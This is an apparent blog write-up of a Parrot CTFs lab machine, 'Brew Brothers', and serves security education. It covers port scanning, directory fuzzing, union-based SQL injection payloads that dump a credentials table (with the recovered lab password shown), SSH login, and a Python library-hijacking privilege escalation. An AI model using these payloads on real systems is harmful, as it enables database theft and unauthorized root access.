<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1"> <meta name="description" content="🦜 Parrot CTFs is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag chal..."> <link type="application/atom+xml" rel="alternate" href="https://fmf-x0.github.io/feed.xml" title="FmF" /> <!-- Begin Jekyll SEO tag v2.8.0 --> <title>Brew Brothers | FmF</title> <meta name="generator" content="Jekyll v4.3.2" /> <meta property="og:title" content="Brew Brothers" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="🦜 Parrot CTFs is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios. This is an easy difficulty machine that exploits a SQL injection vulnerability and library hijacking in a Python script to gain root privileges. Content: Enumeration SQLI Privilege escalation Enumeration 🔎: We start by using ping to check the TTL of the machine to determine the OS we are dealing with. Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: Identify OS using TTL value. Now, let’s go with an nmap scan to view the open ports. sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.32 -oN allPorts -p- –&gt; We are doing a scan against all 65535 ports to search for open ports. --open –&gt; It will only report open ports. -sS –&gt; It can be performed quickly, scanning thousands of ports per second. --min-rate 5000 –&gt; It sets the minimum rate of packets sent per second to 5000. -n –&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds. -v –&gt; It will be verbose in its output. -Pn –&gt; This option skips the host discovery stage. -oN –&gt; It will save the output in a file called “allPorts”. We find out the following open ports: Let’s take a look at what the page has. Well… nothing, it is a default page of apache2, so let’s start fuzzing. You can use whatever fuzzing tool you want, in my case I am going to use wfuzz. wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.14.0.32/FUZZ We are doing a simple fuzzing to find directories and we find website that seems interesting. There is an about.html page, but it is not interesting. So let’s start fuzzing again but this time let’s search for .html pages. wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.14.0.32/website/FUZZ.html We found these: contact.html and search.html. The contact.html page doesn’t appear to have any functional or reflected elements where we can inject something. However the search.html page is interesting because is trying to get data from something so we can try to test for SQLI. SQLI 💉: So how can we know if this is vulnerable to a SQL injection?, let’s do a simple injection like ’ OR 1=1– - if this give us all the data that the actual db has, we can keep doing futher injections to try to get creds if there exists. Yeah! there is a result of all the entries that are in the actual db. Let’s start doing more injections 💉: This is to view which fields of output we have control over. &#39; union select 1,2-- - This is to view all the available databases. There, we can see an interesting database name, which is creds. &#39; union select 1,group_concat(schema_name) from information_schema.schemata-- - With this, we can view the table names of the database, and there is only one table, which is named credentials. &#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;creds&quot;-- - With this, we can see the column names, which are username and password. &#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&quot;creds&quot; and table_name=&quot;credentials&quot;-- - So know that we have enumerating the db let’s retrive all the usernames and passwords. &#39; union select 1,group_concat(username,&quot;:&quot;,password) from creds.credentials-- - With this we can retrive only one credential that is: charles:pyvzngr You can learn to do this injections here, and remember there is a lot of material out there for you to learn more about SQLI. So now that we have the credentials, we can try to log in through SSH, and once successful, we will have access to the machine as the user “charles”. Privilege escalation 🚩: Now that we are inside the machine you need to do some things to ensure smooth operation: bash export TERM=xterm This will allow us to clean the screen with ctrl + l. We need to enumerate the system to find a way to escalate privileges. One thing I always check first is sudo -l. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user. More info about privilege escalation check here. We can see that we can execute a python3 script like root user but we can’t edit it :( The script basically hashes a random value and writes it to a file. It doesn’t seem to be useful, but we can see that it imports various libraries. The issue here is that we have write permissions in the directory where the Python3 script is located. Thanks to the priority python library path, we can add a malicious Python3 script to gain a shell with root user privileges. To accomplish this, we need to create a Python3 file and include the name of the module that is being imported, like this: Now, the only thing we need to do to become root is to execute the script with sudo privileges. Hope you like it and learn something new :)" /> <meta property="og:description" content="🦜 Parrot CTFs is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios. This is an easy difficulty machine that exploits a SQL injection vulnerability and library hijacking in a Python script to gain root privileges. Content: Enumeration SQLI Privilege escalation Enumeration 🔎: We start by using ping to check the TTL of the machine to determine the OS we are dealing with. Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: Identify OS using TTL value. Now, let’s go with an nmap scan to view the open ports. sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.32 -oN allPorts -p- –&gt; We are doing a scan against all 65535 ports to search for open ports. --open –&gt; It will only report open ports. -sS –&gt; It can be performed quickly, scanning thousands of ports per second. --min-rate 5000 –&gt; It sets the minimum rate of packets sent per second to 5000. -n –&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds. -v –&gt; It will be verbose in its output. -Pn –&gt; This option skips the host discovery stage. -oN –&gt; It will save the output in a file called “allPorts”. We find out the following open ports: Let’s take a look at what the page has. Well… nothing, it is a default page of apache2, so let’s start fuzzing. You can use whatever fuzzing tool you want, in my case I am going to use wfuzz. wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.14.0.32/FUZZ We are doing a simple fuzzing to find directories and we find website that seems interesting. There is an about.html page, but it is not interesting. So let’s start fuzzing again but this time let’s search for .html pages. wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.14.0.32/website/FUZZ.html We found these: contact.html and search.html. The contact.html page doesn’t appear to have any functional or reflected elements where we can inject something. However the search.html page is interesting because is trying to get data from something so we can try to test for SQLI. SQLI 💉: So how can we know if this is vulnerable to a SQL injection?, let’s do a simple injection like ’ OR 1=1– - if this give us all the data that the actual db has, we can keep doing futher injections to try to get creds if there exists. Yeah! there is a result of all the entries that are in the actual db. Let’s start doing more injections 💉: This is to view which fields of output we have control over. &#39; union select 1,2-- - This is to view all the available databases. There, we can see an interesting database name, which is creds. &#39; union select 1,group_concat(schema_name) from information_schema.schemata-- - With this, we can view the table names of the database, and there is only one table, which is named credentials. &#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;creds&quot;-- - With this, we can see the column names, which are username and password. &#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&quot;creds&quot; and table_name=&quot;credentials&quot;-- - So know that we have enumerating the db let’s retrive all the usernames and passwords. &#39; union select 1,group_concat(username,&quot;:&quot;,password) from creds.credentials-- - With this we can retrive only one credential that is: charles:pyvzngr You can learn to do this injections here, and remember there is a lot of material out there for you to learn more about SQLI. So now that we have the credentials, we can try to log in through SSH, and once successful, we will have access to the machine as the user “charles”. Privilege escalation 🚩: Now that we are inside the machine you need to do some things to ensure smooth operation: bash export TERM=xterm This will allow us to clean the screen with ctrl + l. We need to enumerate the system to find a way to escalate privileges. One thing I always check first is sudo -l. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user. More info about privilege escalation check here. We can see that we can execute a python3 script like root user but we can’t edit it :( The script basically hashes a random value and writes it to a file. It doesn’t seem to be useful, but we can see that it imports various libraries. The issue here is that we have write permissions in the directory where the Python3 script is located. Thanks to the priority python library path, we can add a malicious Python3 script to gain a shell with root user privileges. To accomplish this, we need to create a Python3 file and include the name of the module that is being imported, like this: Now, the only thing we need to do to become root is to execute the script with sudo privileges. Hope you like it and learn something new :)" /> <link rel="canonical" href="https://fmf-x0.github.io/parrot-ctf/Brew-Brothers" /> <meta property="og:url" content="https://fmf-x0.github.io/parrot-ctf/Brew-Brothers" /> <meta property="og:site_name" content="FmF" /> <meta property="og:type" content="article" /> <meta property="article:published_time" content="2023-06-03T00:00:00-05:00" /> <meta name="twitter:card" content="summary" /> <meta property="twitter:title" content="Brew Brothers" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-06-03T00:00:00-05:00","datePublished":"2023-06-03T00:00:00-05:00","description":"🦜 Parrot CTFs is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios. This is an easy difficulty machine that exploits a SQL injection vulnerability and library hijacking in a Python script to gain root privileges. Content: Enumeration SQLI Privilege escalation Enumeration 🔎: We start by using ping to check the TTL of the machine to determine the OS we are dealing with. Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: Identify OS using TTL value. Now, let’s go with an nmap scan to view the open ports. sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.32 -oN allPorts -p- –&gt; We are doing a scan against all 65535 ports to search for open ports. --open –&gt; It will only report open ports. -sS –&gt; It can be performed quickly, scanning thousands of ports per second. --min-rate 5000 –&gt; It sets the minimum rate of packets sent per second to 5000. -n –&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds. -v –&gt; It will be verbose in its output. -Pn –&gt; This option skips the host discovery stage. -oN –&gt; It will save the output in a file called “allPorts”. We find out the following open ports: Let’s take a look at what the page has. Well… nothing, it is a default page of apache2, so let’s start fuzzing. You can use whatever fuzzing tool you want, in my case I am going to use wfuzz. wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.14.0.32/FUZZ We are doing a simple fuzzing to find directories and we find website that seems interesting. There is an about.html page, but it is not interesting. So let’s start fuzzing again but this time let’s search for .html pages. wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.14.0.32/website/FUZZ.html We found these: contact.html and search.html. The contact.html page doesn’t appear to have any functional or reflected elements where we can inject something. However the search.html page is interesting because is trying to get data from something so we can try to test for SQLI. SQLI 💉: So how can we know if this is vulnerable to a SQL injection?, let’s do a simple injection like ’ OR 1=1– - if this give us all the data that the actual db has, we can keep doing futher injections to try to get creds if there exists. Yeah! there is a result of all the entries that are in the actual db. Let’s start doing more injections 💉: This is to view which fields of output we have control over. &#39; union select 1,2-- - This is to view all the available databases. There, we can see an interesting database name, which is creds. &#39; union select 1,group_concat(schema_name) from information_schema.schemata-- - With this, we can view the table names of the database, and there is only one table, which is named credentials. &#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;creds&quot;-- - With this, we can see the column names, which are username and password. &#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&quot;creds&quot; and table_name=&quot;credentials&quot;-- - So know that we have enumerating the db let’s retrive all the usernames and passwords. &#39; union select 1,group_concat(username,&quot;:&quot;,password) from creds.credentials-- - With this we can retrive only one credential that is: charles:pyvzngr You can learn to do this injections here, and remember there is a lot of material out there for you to learn more about SQLI. So now that we have the credentials, we can try to log in through SSH, and once successful, we will have access to the machine as the user “charles”. Privilege escalation 🚩: Now that we are inside the machine you need to do some things to ensure smooth operation: bash export TERM=xterm This will allow us to clean the screen with ctrl + l. We need to enumerate the system to find a way to escalate privileges. One thing I always check first is sudo -l. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user. More info about privilege escalation check here. We can see that we can execute a python3 script like root user but we can’t edit it :( The script basically hashes a random value and writes it to a file. It doesn’t seem to be useful, but we can see that it imports various libraries. The issue here is that we have write permissions in the directory where the Python3 script is located. Thanks to the priority python library path, we can add a malicious Python3 script to gain a shell with root user privileges. To accomplish this, we need to create a Python3 file and include the name of the module that is being imported, like this: Now, the only thing we need to do to become root is to execute the script with sudo privileges. Hope you like it and learn something new :)","headline":"Brew Brothers","mainEntityOfPage":{"@type":"WebPage","@id":"https://fmf-x0.github.io/parrot-ctf/Brew-Brothers"},"url":"https://fmf-x0.github.io/parrot-ctf/Brew-Brothers"}</script> <!-- End Jekyll SEO tag --> <link rel="shortcut icon" href="/favicon.ico" type="image/icon"> <link rel="icon" href="/favicon.ico" type="image/icon"> <!-- stylesheets --> <link rel="stylesheet" type="text/css" href="/assets/css/base.css"> <link rel="stylesheet" type="text/css" href="/assets/css/simplePagination.css"> <link rel="stylesheet" type="text/css" href="/assets/css/highlight-theme.css"> <link rel="stylesheet" type="text/css" href="/assets/css/rouge-code.css"> <link rel="stylesheet" type="text/css" href="/assets/css/post.css"> <!-- javascripts --> <script type="text/javascript" src="/assets/js/jquery.js"></script> <!--[if lt IE 9]> <script src="/assets/js/html5shiv.js"></script> <![endif]--> </head> <!-- bare layout means not header and footer like resume --> <body> <header id="l-header"> <div class="container"> <div class="row navicon"> <a href=""><i class="fa fa-navicon"></i></a> </div> <div class="row navbar"> <nav class="col-lg-8 col-md-8 col-xs-12"> <ul class="row"> <li class="col-lg-3"><a href="/">HOME</a></li> <li class="col-lg-3"> <ul class="subnav"> <a href="javascript:void(0)">POST</a> <li><a href="/category">CATEGORY</a></li> <li><a href="/tag">TAG</a></li> </ul> </li> <li class="col-lg-3"><a href="/about">ABOUT</a></li> </ul> </nav> <div class="search col-lg-4 col-md-4 col-xs-12"> <form> <label for="search"></label> <input id="search-input" name="serach" type="text" placeholder="Search Blog Posts..."> <i class="fa fa-search"></i> </form> </div> </div> </div> </header> <section id="l-main"> <div class="container"> <div id="search-result-wrapper" class="hidden"> <h3>Search Results:</h3> <div id="search-result"></div> </div> <style> #search-result-wrapper { font-size: 2rem; background-color: #eee; padding: 5rem; padding-left: 31rem; margin-top: 1rem; margin-bottom: 1rem; box-shadow: 0 0 10px #999; border-radius: 5px; background: white; } #search-result { padding-left: 3rem; } @media (max-width: 1200px) { #search-result-wrapper { font-size: 1.7rem; padding: 2rem; } #search-result { padding-left: 1rem; } } @media (max-width: 768px) { #search-result-wrapper { margin-top: 24rem !important; } } </style> <script> $(document).ready(function() { input = $("#search-input"); wrapper = $("#search-result-wrapper"); wrapper.hide(); wrapper.removeClass("hidden"); input.on("keyup change", function() { if (! input.val()) { wrapper.slideUp("ease"); } else { wrapper.slideDown("ease"); } }); }); </script> <script src="/assets/js/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-result'), json: "/search.json" }); </script> <div class="row"> <div id="markdown-container" class="col-lg-12"> <header> <p id="post-title">Brew brothers</p> <ul class="tags clearfix"> <li><i class="fa fa-tag"></i> Parrot-CTF</li> <li><i class="fa fa-tag"></i> Easy</li> </ul> </header> <p><img src="/assets/img/BrewBrothers/1.jpg" width="800" /></p> <p><a href="https://parrot-ctfs.com/">🦜 Parrot CTFs</a> is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios.</p> <p>This is an easy difficulty machine that exploits a SQL injection vulnerability and library hijacking in a Python script to gain root privileges.</p> <h1 id="content">Content:</h1> <ul> <li><a href="#enumeration-">Enumeration</a></li> <li><a href="#sqli-">SQLI</a></li> <li><a href="#privilege-escalation-">Privilege escalation</a></li> </ul> <h1 id="enumeration-">Enumeration 🔎:</h1> <p>We start by using <code class="language-plaintext highlighter-rouge">ping</code> to check the TTL of the machine to determine the OS we are dealing with.</p> <p><img src="/assets/img/BrewBrothers/2.png" width="600" /></p> <p>Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href="https://ostechnix.com/identify-operating-system-ttl-ping/">Identify OS using TTL value</a>.</p> <p>Now, let’s go with an nmap scan to view the open ports.</p> <p><code class="language-plaintext highlighter-rouge">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.32 -oN allPorts</code></p> <p><code class="language-plaintext highlighter-rouge">-p-</code> –&gt; We are doing a scan against all 65535 ports to search for open ports.</p> <p><code class="language-plaintext highlighter-rouge">--open</code> –&gt; It will only report open ports.</p> <p><code class="language-plaintext highlighter-rouge">-sS</code> –&gt; It can be performed quickly, scanning thousands of ports per second.</p> <p><code class="language-plaintext highlighter-rouge">--min-rate 5000</code> –&gt; It sets the minimum rate of packets sent per second to 5000.</p> <p><code class="language-plaintext highlighter-rouge">-n</code> –&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p> <p><code class="language-plaintext highlighter-rouge">-v</code> –&gt; It will be verbose in its output.</p> <p><code class="language-plaintext highlighter-rouge">-Pn</code> –&gt; This option skips the host discovery stage.</p> <p><code class="language-plaintext highlighter-rouge">-oN</code> –&gt; It will save the output in a file called “allPorts”.</p> <p>We find out the following open ports:</p> <p><img src="/assets/img/BrewBrothers/3.png" width="600" /></p> <p>Let’s take a look at what the page has.</p> <p><img src="/assets/img/BrewBrothers/4.png" width="600" /></p> <p>Well… nothing, it is a default page of apache2, so let’s start fuzzing.</p> <p>You can use whatever fuzzing tool you want, in my case I am going to use <code class="language-plaintext highlighter-rouge">wfuzz</code>.</p> <p><code class="language-plaintext highlighter-rouge">wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.14.0.32/FUZZ</code></p> <p>We are doing a simple fuzzing to find directories and we find website that seems interesting.</p> <p><img src="/assets/img/BrewBrothers/5.png" width="600" /></p> <p>There is an <code class="language-plaintext highlighter-rouge">about.html</code> page, but it is not interesting.</p> <p>So let’s start fuzzing again but this time let’s search for <code class="language-plaintext highlighter-rouge">.html</code> pages.</p> <p><code class="language-plaintext highlighter-rouge">wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.14.0.32/website/FUZZ.html</code></p> <p>We found these: <code class="language-plaintext highlighter-rouge">contact.html</code> and <code class="language-plaintext highlighter-rouge">search.html</code>.</p> <p>The <code class="language-plaintext highlighter-rouge">contact.html</code> page doesn’t appear to have any functional or reflected elements where we can inject something.</p> <p>However the <code class="language-plaintext highlighter-rouge">search.html</code> page is interesting because is trying to get data from something so we can try to test for SQLI.</p> <h1 id="sqli-">SQLI 💉:</h1> <p>So how can we know if this is vulnerable to a SQL injection?, let’s do a simple injection like <a>’ OR 1=1– -</a> if this give us all the data that the actual db has, we can keep doing futher injections to try to get creds if there exists.</p> <p><img src="/assets/img/BrewBrothers/6.png" width="400" /></p> <p>Yeah! there is a result of all the entries that are in the actual db.</p> <p>Let’s start doing more injections 💉:</p> <p>This is to view which fields of output we have control over.</p> <p><code class="language-plaintext highlighter-rouge">' union select 1,2-- -</code></p> <p><img src="/assets/img/BrewBrothers/7.png" width="100" /></p> <p>This is to view all the available databases. There, we can see an interesting database name, which is <a>creds</a>.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' union select 1,group_concat(schema_name) from information_schema.schemata-- -
</code></pre></div></div> <p><img src="/assets/img/BrewBrothers/8.png" width="500" /></p> <p>With this, we can view the table names of the database, and there is only one table, which is named <code class="language-plaintext highlighter-rouge">credentials</code>.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' union select 1,group_concat(table_name) from information_schema.tables where table_schema="creds"-- -
</code></pre></div></div> <p><img src="/assets/img/BrewBrothers/9.png" width="180" /></p> <p>With this, we can see the column names, which are <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code>.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' union select 1,group_concat(column_name) from information_schema.columns where table_schema="creds" and table_name="credentials"-- -
</code></pre></div></div> <p><img src="/assets/img/BrewBrothers/10.png" width="300" /></p> <p>So know that we have enumerating the db let’s retrive all the usernames and passwords.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' union select 1,group_concat(username,":",password) from creds.credentials-- -
</code></pre></div></div> <p><img src="/assets/img/BrewBrothers/11.png" width="300" /></p> <p>With this we can retrive only one credential that is: charles:pyvzngr</p> <p>You can learn to do this injections <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection">here</a>, and remember there is a lot of material out there for you to learn more about SQLI.</p> <p>So now that we have the credentials, we can try to log in through SSH, and once successful, we will have access to the machine as the user “<strong>charles</strong>”.</p> <h1 id="privilege-escalation-">Privilege escalation 🚩:</h1> <p>Now that we are inside the machine you need to do some things to ensure smooth operation:</p> <ol> <li><code class="language-plaintext highlighter-rouge">bash</code></li> <li><code class="language-plaintext highlighter-rouge">export TERM=xterm</code></li> </ol> <p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code>.</p> <p>We need to enumerate the system to find a way to escalate privileges.</p> <p>One thing I always check first is <code class="language-plaintext highlighter-rouge">sudo -l</code>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user.</p> <p>More info about privilege escalation check <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">here</a>.</p> <p><img src="/assets/img/BrewBrothers/12.png" width="600" /></p> <p>We can see that we can execute a python3 script like root user but we can’t edit it :(</p> <p><img src="/assets/img/BrewBrothers/13.png" width="600" /></p> <p>The script basically hashes a random value and writes it to a file. It doesn’t seem to be useful, but we can see that it imports various libraries.</p> <p>The issue here is that we have write permissions in the directory where the Python3 script is located. Thanks to the priority python library path, we can add a malicious Python3 script to gain a shell with root user privileges. To accomplish this, we need to create a Python3 file and include the name of the module that is being imported, like this:</p> <p><img src="/assets/img/BrewBrothers/14.png" width="600" /></p> <p>Now, the only thing we need to do to become root is to execute the script with sudo privileges.</p> <p><img src="/assets/img/BrewBrothers/15.png" width="600" /></p> <p>Hope you like it and learn something new :)</p> </div> </div> </div> </section> <style> footer { text-align: center; padding: 20px; /* Optional: Add padding for spacing */ color: #fff; /* Optional: Set text color */ } </style> <footer> <h3>Made with ❤️ by <span style="color: #cf0;">FmF</span></h3> </footer> </body> </html>
